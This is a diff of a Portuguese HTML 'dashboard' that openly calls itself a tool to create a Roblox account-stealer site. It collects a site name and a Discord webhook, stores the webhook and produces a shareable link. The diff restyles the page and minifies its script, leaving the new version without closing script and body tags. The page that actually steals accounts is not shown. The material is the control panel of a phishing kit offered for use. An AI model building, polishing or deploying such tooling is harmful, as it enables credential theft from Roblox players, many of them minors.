@@ -1,92 +1,79 @@
+<!-- DASHBOARD INDEX.HTML ANIMADO -->
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <title>Cookie • Dashboard</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      margin: 0;
-      background: #0f0f0f;
-      color: #fff;
-      font-family: Arial, sans-serif;
-    }
-    .box {
-      max-width: 500px;
-      margin: 80px auto;
-      background: #1c1c1c;
-      padding: 24px;
-      border-radius: 14px;
-    }
-    input, button {
-      width: 100%;
-      padding: 12px;
-      margin-top: 12px;
-      border-radius: 10px;
-      border: none;
-      font-size: 14px;
-    }
-    input {
-      background: #2a2a2a;
-      color: #fff;
-    }
-    button {
-      background: #5865F2;
-      color: #fff;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    .link {
-      background: #111;
-      padding: 10px;
-      border-radius: 8px;
-      word-break: break-all;
-      margin-top: 10px;
-    }
-  </style>
+<meta charset="UTF-8">
+<title>Dashboard</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+*{box-sizing:border-box}
+body{
+margin:0;
+background:linear-gradient(135deg,#0f0f0f,#151515);
+font-family:Inter,Arial,sans-serif;
+color:#fff;
+animation:fadeIn 1s ease;
+}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+.card{
+max-width:420px;
+margin:80px auto;
+background:#1c1c1c;
+border-radius:18px;
+padding:26px;
+box-shadow:0 0 40px rgba(0,0,0,.4);
+}
+h1{margin:0 0 6px}
+p{opacity:.7;font-size:14px}
+input,button{
+width:100%;
+margin-top:14px;
+padding:14px;
+border:none;
+border-radius:12px;
+font-size:14px;
+}
+input{background:#2a2a2a;color:#fff}
+button{
+background:#5865F2;
+color:#fff;
+font-weight:700;
+cursor:pointer;
+transition:.25s;
+}
+button:hover{transform:scale(1.04);filter:brightness(1.1)}
+.link{
+background:#111;
+margin-top:14px;
+padding:12px;
+border-radius:10px;
+word-break:break-all;
+}
+</style>
 </head>
 <body>
-
-  <div class="box">
-    <h2>Criar site Roubador de Contas Roblox</h2>
-    <p>By Tobyxxzz😈</p>
-
-    <input id="nome" placeholder="nome-do-site">
-    <input id="webhook" placeholder="Webhook do Discord">
-
-    <button onclick="criar()">Criar site</button>
-
-    <div id="out" style="display:none">
-      <h3>Link do site</h3>
-      <div class="link" id="link"></div>
-      <button onclick="copiar()">Copiar link</button>
-    </div>
-  </div>
-
-  <script>
-    function criar() {
-      const nome = document.getElementById("nome").value.trim();
-      const webhook = document.getElementById("webhook").value.trim();
-
-      if (!nome || !webhook) {
-        alert("Preencha");
-        return;
-      }
-
-      localStorage.setItem("webhook_" + nome, webhook);
-
-      const url = location.origin + "/" + nome;
-      document.getElementById("link").innerText = url;
-      document.getElementById("out").style.display = "block";
-    }
-
-    function copiar() {
-      navigator.clipboard.writeText(
-        document.getElementById("link").innerText
-      );
-      alert("Copiado!");
-    }
-  </script>
-
-</body>
+<div class="card">
+<h1>Cookie</h1>
+<p>Crie um site roubador de contas roblox</p>
+<input id="nome" placeholder="nome-do-site">
+<input id="webhook" placeholder="Webhook do Discord">
+<button onclick="criar()">Criar site</button>
+<div id="out" style="display:none">
+<div class="link" id="link"></div>
+<button onclick="copiar()">Compartilhar link</button>
+</div>
+</div>
+<script>
+function criar(){
+const n=nome.value.trim();
+const w=webhook.value.trim();
+if(!n||!w)return alert("Preencha, por favor");
+localStorage.setItem("webhook_"+n,w);
+link.innerText=location.origin+"/"+n;
+out.style.display="block";
+}
+function copiar(){
+navigator.clipboard.writeText(link.innerText);
+alert("Link copiado!");
+}
 </html>
